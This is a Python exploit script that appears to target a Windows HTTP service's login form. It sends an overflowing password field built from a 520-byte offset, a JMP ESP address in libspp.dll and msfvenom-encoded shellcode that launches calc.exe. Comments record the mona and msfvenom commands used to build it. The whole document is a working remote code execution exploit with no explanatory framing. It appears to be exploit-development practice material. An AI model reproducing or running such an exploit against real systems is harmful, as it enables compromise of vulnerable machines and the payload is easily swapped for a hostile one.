#!/usr/bin/python3
from pwn import remote, p32

# !py mona pattern_offset eip
offset = 520
junk = b"A" * offset

# !py mona jmp -r esp -m libspp.dll
jmpesp = p32(0x10090c83)

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a\x0d\x25\x26\x2b\x3d' -e x86/jmp_call_additive -n 4
shellcode =  b""
shellcode += b"\x90\x91\x9b\x27\xfc\xbb\x66\xc4\x1c\x99\xeb"
shellcode += b"\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75"
shellcode += b"\xf7\xc3\xe8\xef\xff\xff\xff\x9a\x2c\x9e\x99"
shellcode += b"\x62\xad\xff\x10\x87\x9c\x3f\x46\xcc\x8f\x8f"
shellcode += b"\x0c\x80\x23\x7b\x40\x30\xb7\x09\x4d\x37\x70"
shellcode += b"\xa7\xab\x76\x81\x94\x88\x19\x01\xe7\xdc\xf9"
shellcode += b"\x38\x28\x11\xf8\x7d\x55\xd8\xa8\xd6\x11\x4f"
shellcode += b"\x5c\x52\x6f\x4c\xd7\x28\x61\xd4\x04\xf8\x80"
shellcode += b"\xf5\x9b\x72\xdb\xd5\x1a\x56\x57\x5c\x04\xbb"
shellcode += b"\x52\x16\xbf\x0f\x28\xa9\x69\x5e\xd1\x06\x54"
shellcode += b"\x6e\x20\x56\x91\x49\xdb\x2d\xeb\xa9\x66\x36"
shellcode += b"\x28\xd3\xbc\xb3\xaa\x73\x36\x63\x16\x85\x9b"
shellcode += b"\xf2\xdd\x89\x50\x70\xb9\x8d\x67\x55\xb2\xaa"
shellcode += b"\xec\x58\x14\x3b\xb6\x7e\xb0\x67\x6c\x1e\xe1"
shellcode += b"\xcd\xc3\x1f\xf1\xad\xbc\x85\x7a\x43\xa8\xb7"
shellcode += b"\x21\x0e\x2f\x45\x5c\x7c\x2f\x55\x5e\xd1\x58"
shellcode += b"\x64\xd5\xbe\x1f\x79\x3c\xfb\xd0\x33\x1c\xaa"
shellcode += b"\x78\x9a\xf5\xee\xe4\x1d\x20\x2c\x11\x9e\xc0"
shellcode += b"\xcd\xe6\xbe\xa1\xc8\xa3\x78\x5a\xa1\xbc\xec"
shellcode += b"\x5c\x16\xbc\x24\x3f\xf9\x2e\xa4\x91\x9c\xd6"
shellcode += b"\x4f\xed\x5e\x27\x90\xed\x5e\x27\x90"

payload = junk + jmpesp + shellcode

data = b"username=username&password=" + payload

content  = b""
content += b"POST /login HTTP/1.1\r\n"
content += b"Content-Type: application/x-www-form-urlencoded\r\n"
content += b"Content-Length: " + str(len(data)).encode() + b"\r\n\r\n"
content += data

shell = remote("Windows", 80)
shell.send(content)
